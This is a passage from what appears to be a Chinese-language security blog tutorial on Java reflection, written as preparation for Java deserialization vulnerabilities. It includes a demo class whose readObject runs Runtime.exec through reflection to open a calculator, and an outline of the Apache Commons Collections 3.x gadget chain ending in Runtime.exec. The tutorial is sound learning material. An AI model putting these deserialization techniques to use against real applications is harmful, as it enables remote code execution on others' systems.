x.toString();</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class operation1&#123;</span><br><span class="line">	public static void ser(Object obj) &#123;</span><br><span class="line">		&#x2F;&#x2F;序列化操作，写操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectOutputStream ooStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;));</span><br><span class="line">			&#x2F;&#x2F;ObjectOutputStream能把Object输出成Byte流</span><br><span class="line">			ooStream.writeObject(obj);</span><br><span class="line">			ooStream.flush();</span><br><span class="line">			ooStream.close();</span><br><span class="line">			</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void deser() &#123;</span><br><span class="line">		&#x2F;&#x2F;反序列化，读取操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectInputStream iiStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;));</span><br><span class="line">			Object xObject &#x3D; iiStream.readObject();</span><br><span class="line">			System.out.println(xObject);</span><br><span class="line">			iiStream.close();</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>







<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014255733.png" alt="img"></p>
<p>总结：</p>
<p>这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中。但是一般会有其他的代码逻辑，如果它的代码逻辑里，如果有某一个分支有像method.invoke()这种可以调用其他函数的代码，那么就可以跳转过去，再从这个“其他函数”的角度去看有没有执行代码或调用其他函数的可能。这个“其他函数”也就是所谓的gadget了。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/xdp-gacl/p/3777987.html">http://www.cnblogs.com/xdp-gacl/p/3777987.html</a></p>
<p><a target="_blank" rel="noopener" href="http://www.importnew.com/20125.html">http://www.importnew.com/20125.html</a></p>
<p><a target="_blank" rel="noopener" href="http://beautyboss.farbox.com/post/study/shen-ru-xue-xi-javaxu-lie-hua">http://beautyboss.farbox.com/post/study/shen-ru-xue-xi-javaxu-lie-hua</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%BA%8C-Java%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%88Java-Reflection%EF%BC%89/"><i class="fas fa-angle-double-right"></i>Java反序列化漏洞学习实践二-Java的反射机制（Java Reflection）</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-29T11:35:16.612Z" title="2020-12-29T11:35:16.612Z">2020-12-29</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-29</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">15 minutes read (About 2294 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%BA%8C-Java%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%88Java-Reflection%EF%BC%89/">Java反序列化漏洞学习实践二-Java的反射机制（Java Reflection）</a></h1><div class="content"><p>学习Java的反射机制是为了理解Apache Commons Collections中的反序列化漏洞做准备的。</p>
<h3 id="0x0、基础"><a href="#0x0、基础" class="headerlink" title="0x0、基础"></a>0x0、基础</h3><p><strong>Java反射机制</strong></p>
<ul>
<li>指的是可以于运行时加载,探知和使用编译期间完全未知的类.</li>
<li>程序在运行状态中, 可以动态加载一个只有名称的类, 对于任意一个已经加载的类,都能够知道这个类的所有属性和方法; 对于任意一个对象,都能调用他的任意一个方法和属性;</li>
<li>加载完类之后, 在堆内存中会产生一个Class类型的对象(一个类只有一个Class对象), 这个对象包含了完整的类的结构信息,而且这个Class对象就像一面镜子,透过这个镜子看到类的结构,所以被称之为:反射.</li>
<li>每个类被加载进入内存之后,系统就会为该类生成一个对应的java.lang.Class对象,通过该Class对象就可以访问到JVM中的这个类.</li>
</ul>
<p><strong>Class对象的获取方法</strong></p>
<ul>
<li>实例对象的getClass()方法;</li>
<li>类的.class(最安全/性能最好)属性;（如demo代码和下图）</li>
<li>运用Class.forName(String className)动态加载类,className需要是类的全限定名(最常用).</li>
</ul>
<p>注意，有一点很有趣，使用功能”.class”来创建Class对象的引用时，不会自动初始化该Class对象，使用forName()会自动初始化该Class对象</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014329604.png" alt="img"></p>
<h3 id="0x1、通过反射方法调用函数"><a href="#0x1、通过反射方法调用函数" class="headerlink" title="0x1、通过反射方法调用函数"></a>0x1、通过反射方法调用函数</h3><p>该demo主要实践学习使用反射方法来调用类中的函数。</p>
<p>``</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">package 反序列化2;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class reflectionTest &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		try&#123;</span><br><span class="line">			&#x2F;&#x2F;Class 获取类的方法一：事例化对象的getclass()方法；</span><br><span class="line">			User testObject &#x3D; new User(&quot;zhangsan&quot;,19);</span><br><span class="line">			Class Method1Class &#x3D; testObject.getClass();</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F;Class获取类的方法二：类的.Class(最安全&#x2F;性能最好)属性;有点类似python的getattr()。java中每个类型都有class属性。</span><br><span class="line">			Class method2Class &#x3D; User.class;</span><br><span class="line">		</span><br><span class="line">			&#x2F;&#x2F;Class对象的获取方法三：运用Class.forName(String className)动态加载类，className需要是类的全限定名（最常用）</span><br><span class="line">			&#x2F;&#x2F;这种方法也最容易理解，通过类名（jar包中的完整namespace）就可以调用其中方法，也最符合我们需要的使用场景</span><br><span class="line">			&#x2F;&#x2F;j2eeScan burp 插件就使用了这种反射机制</span><br><span class="line">			String path &#x3D; &quot;反序列化2.User&quot;;</span><br><span class="line">			Class method3Class &#x3D; Class.forName(path);</span><br><span class="line">			</span><br><span class="line">			Method[] methods &#x3D; method3Class.getMethods();</span><br><span class="line">			 </span><br><span class="line">			&#x2F;&#x2F;通过类的class属性获取对应的Class类的对象，通过这个Class类的对象获取test类中的方法集合</span><br><span class="line">		</span><br><span class="line">		    &#x2F;* String name &#x3D; Method3Class.getName();</span><br><span class="line">		     * int modifiers &#x3D; Method3Class.getModifiers();</span><br><span class="line">		     * .....还有很多方法</span><br><span class="line">		     * 也就是说，对于一个任意的可以访问到的类，我们都能够通过以上这些方法来知道它的所有的方法和属性；</span><br><span class="line">		     * 知道了它的方法和属性，就可以调用这些方法和属性。</span><br><span class="line">		     *&#x2F;</span><br><span class="line">		</span><br><span class="line">		    &#x2F;&#x2F;调用User类中的方法</span><br><span class="line">			</span><br><span class="line">			for(Method method: methods) &#123;</span><br><span class="line">				if(method.getName().equals(&quot;getName&quot;)) &#123;</span><br><span class="line">					System.out.println(&quot;method &#x3D; &quot; + method.getName());</span><br><span class="line">					Class[] parameterTypes &#x3D; method.getParameterTypes(); &#x2F;&#x2F;获取方法的参数</span><br><span class="line">					Class returnType &#x3D; method.getReturnType(); &#x2F;&#x2F;获取方法的返回类型</span><br><span class="line">					try &#123;</span><br><span class="line">						User user &#x3D; (User)method3Class.newInstance();</span><br><span class="line">						Object x  &#x3D; method.invoke(user);  &#x2F;&#x2F;user.getName;</span><br><span class="line">						&#x2F;&#x2F;Object x &#x3D; method.invoke(new test(1), 666);</span><br><span class="line">			            &#x2F;&#x2F;new关键字能调用任何构造方法,newInstance()只能调用无参构造方法。但反射的场景中是不应该有机会使用new关键词的。</span><br><span class="line">			            System.out.println(x);</span><br><span class="line">					&#125; catch (Exception e) &#123;</span><br><span class="line">						&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">						e.printStackTrace();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			Method method1 &#x3D; method3Class.getMethod(&quot;setName&quot;, String.class);</span><br><span class="line">			User user1 &#x3D; (User)method3Class.getConstructor(String.class,Integer.class).newInstance(&quot;lisi&quot;,19);</span><br><span class="line">			&#x2F;&#x2F;调用自定义构造器的方法</span><br><span class="line">			Object x &#x3D; method1.invoke(user1, &quot;李四&quot;);&#x2F;&#x2F;第一个参数是类的对象。第二个参数是函数的参数</span><br><span class="line">			System.out.println(user1.getName());</span><br><span class="line">			&#125;catch(Exception e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User&#123;</span><br><span class="line">	private Integer age;</span><br><span class="line">	private String name;</span><br><span class="line">	</span><br><span class="line">	public User() &#123;&#125;;</span><br><span class="line">	public User(String name,Integer age) &#123;</span><br><span class="line">		this.age &#x3D; age;</span><br><span class="line">		this.name &#x3D; name;</span><br><span class="line">	&#125;</span><br><span class="line">	public Integer getAge() &#123;</span><br><span class="line">		return age;</span><br><span class="line">	&#125;</span><br><span class="line">	public void setAge(Integer age) &#123;</span><br><span class="line">		this.age &#x3D; age;</span><br><span class="line">	&#125;</span><br><span class="line">	public String getName() &#123;</span><br><span class="line">		return name;</span><br><span class="line">	&#125;</span><br><span class="line">	public void setName(String name) &#123;</span><br><span class="line">		this.name &#x3D; name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>

<p><img src="https://leanote.com/api/file/getImage?fileId=5f34e912ab644156ad000813" alt="img"></p>
<h3 id="0x2、通过反射方法弹个计算器"><a href="#0x2、通过反射方法弹个计算器" class="headerlink" title="0x2、通过反射方法弹个计算器"></a>0x2、通过反射方法弹个计算器</h3><p>step1中，我们通过重写readObject方法，直接在里面使用Runtime.getRuntime().exec(“calc.exe”)来执行代码。现在需要改造一下，使用反弹方法来实现，成功调试的代码如下。<code>1</code>1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">package 反序列化2;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class reflectionTest2 implements Serializable&#123;</span><br><span class="line">	&#x2F;&#x2F;创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的</span><br><span class="line">	private static final long serialVersionUID &#x3D; 1L;</span><br><span class="line">	private int n;</span><br><span class="line">	public reflectionTest2(int n) &#123;</span><br><span class="line">		this.n&#x3D;n;</span><br><span class="line">	&#125;</span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;reflectionTest2 [n&#x3D;&quot; + n + &quot;, getClass()&#x3D;&quot; + getClass() + &quot;, hashCode()&#x3D;&quot; + hashCode() + &quot;, toString()&#x3D;&quot;</span><br><span class="line">				+ super.toString() + &quot;]&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException&#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			Method method &#x3D; java.lang.Runtime.class.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">			Object result &#x3D; method.invoke(Runtime.getRuntime(), &quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">			reflectionTest2 x &#x3D; new reflectionTest2(5);</span><br><span class="line">			operation.ser(x);</span><br><span class="line">			operation.deser();</span><br><span class="line">			x.toString();</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class operation&#123;</span><br><span class="line">	public static void ser(Object obj) &#123;</span><br><span class="line">		&#x2F;&#x2F;序列化操作，写操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectOutputStream ooStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;));</span><br><span class="line">			&#x2F;&#x2F;ObjectOutputStream能把Object输出成Byte流</span><br><span class="line">			ooStream.writeObject(obj);</span><br><span class="line">			ooStream.flush();</span><br><span class="line">			ooStream.close();</span><br><span class="line">			</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void deser() &#123;</span><br><span class="line">		&#x2F;&#x2F;反序列化，读取操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectInputStream iiStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;));</span><br><span class="line">			Object xObject &#x3D; iiStream.readObject();</span><br><span class="line">			System.out.println(xObject);</span><br><span class="line">			iiStream.close();</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>执行结果：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014329684.png" alt="img"></p>
<h3 id="0x3、通过setAccessible访问私有属性和函数"><a href="#0x3、通过setAccessible访问私有属性和函数" class="headerlink" title="0x3、通过setAccessible访问私有属性和函数"></a>0x3、通过setAccessible访问私有属性和函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">﻿package 反序列化2;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">&#x2F;*</span><br><span class="line"> * 测试setAccessible方法，可以通过将它设置为true--setAccessible(true) 来访问private属性和函数。</span><br><span class="line"> * 而且可以提高程序的执行效率，因为减少了安全检查。</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class reflectionTest3 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String path &#x3D; &quot;反序列化2.User3&quot;; </span><br><span class="line">            Class clazz &#x3D; Class.forName(path);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;Method method &#x3D; clazz.getMethod(&quot;setName&quot;,String.class);</span><br><span class="line">            &#x2F;&#x2F;getMethod只能获取public的方法，private的方法需要使用getDeclaredMethod来获取，并且设置setAccessible(true)才可以调用访问。</span><br><span class="line">            &#x2F;&#x2F;参数属性也是一样。</span><br><span class="line">            Method method &#x3D; clazz.getDeclaredMethod(&quot;setName&quot;, String.class);</span><br><span class="line">            method.setAccessible(true);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;Constructor strut &#x3D; clazz.getConstructor(String.class,Integer.class);</span><br><span class="line">            &#x2F;&#x2F;getConstructor只能获取public的构造方法</span><br><span class="line">            Constructor strut &#x3D; clazz.getDeclaredConstructor(String.class,Integer.class);</span><br><span class="line">            strut.setAccessible(true);</span><br><span class="line">            User3 user &#x3D; (User3)strut.newInstance(&quot;bit4&quot;,19);</span><br><span class="line">            &#x2F;&#x2F;调用自定义构造器的方法</span><br><span class="line">            Object x &#x3D; method.invoke(user,&quot;比特&quot;);&#x2F;&#x2F;第一个参数是类的对象。第二参数是函数的参数</span><br><span class="line">            System.out.println(user.getName());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User3&#123;</span><br><span class="line"></span><br><span class="line">    private Integer age;</span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    private User3() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    private User3(String name,Integer age)&#123; &#x2F;&#x2F;构造函数，初始化时执行</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private Integer getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void setAge(Integer age) &#123;</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void setName(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014328752.png" alt="img"></p>
<h3 id="0x4、思考总结"><a href="#0x4、思考总结" class="headerlink" title="0x4、思考总结"></a>0x4、思考总结</h3><p>程序的两大根本：变量与函数</p>
<p><em>所以总的来说，要想控制程序实现命令执行，有2个方向</em>：</p>
<p>1.控制代码、函数：就像命名注入等注入类漏洞一样数据被当作了代码执行；或者和上面的demo代码一样重写readObject，加入自定义的代码（当然这种场景基本不存在，任意文件上传和执行勉强算是属于这种情况）。</p>
<p>2.控制输入、数据、变量：利用代码中已有的函数和逻辑，通过改变输入内容的形态实现流程的控制（不同的输入会走不同的逻辑流程，执行不同代码块中的代码）。</p>
<p><em>对于java反序列化漏洞，属于控制数据输入，它有2个基本点必须要满足</em>：</p>
<p>1.有一个可序列化的类，并且该类是重写了readObject()方法的（由于不存在代码注入，只能查找已有代码逻辑中是否有这样的类）。</p>
<p>2.在重写的readObject()方法的逻辑中有 method.invoke函数出现，而且参数可控。</p>
<p><em>再稍作抽象：</em></p>
<p>1.有一个可序列化的类，并且该类是重写了readObject()方法的，除了默认的对象读取外，还有其他处理逻辑。（主线流程，反序列化漏洞都是这个主线逻辑流程，这是反序列化漏洞的入口点。）</p>
<p>2..在重写的readObject()方法的逻辑中有 直接或间接使用类似method.invoke这种可以执行调用任意方法的函数，而且参数可控。（是否还有其他函数可以达到相同的目的呢？）</p>
<p>Apache Commons Collections 3.x 版本的 Gadget 构造过程 就是典型的例子。它的调用链如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                AbstractInputCheckedMapDecorator$MapEntry.setValue()</span><br><span class="line">                    TransformedMap.checkSetValue()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br><span class="line"></span><br><span class="line">    Requires:</span><br><span class="line">        commons-collections &lt;&#x3D; 3.2.1</span><br><span class="line">*&#x2F;﻿</span><br></pre></td></tr></table></figure>



<p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/liujiahan629629/article/details/18013523">http://blog.csdn.net/liujiahan629629/article/details/18013523</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/zjf280441589/article/details/50453776">http://blog.csdn.net/zjf280441589/article/details/50453776</a></p>
<p><a target="_blank" rel="noopener" href="http://ifeve.com/java-reflection/">http://ifeve.com/java-reflection/</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/">Apache Commons Collections 3.x 版本的 Gadget调用链</a><a target="_blank" rel="noopener" href="http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/">http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/</a>)</p>
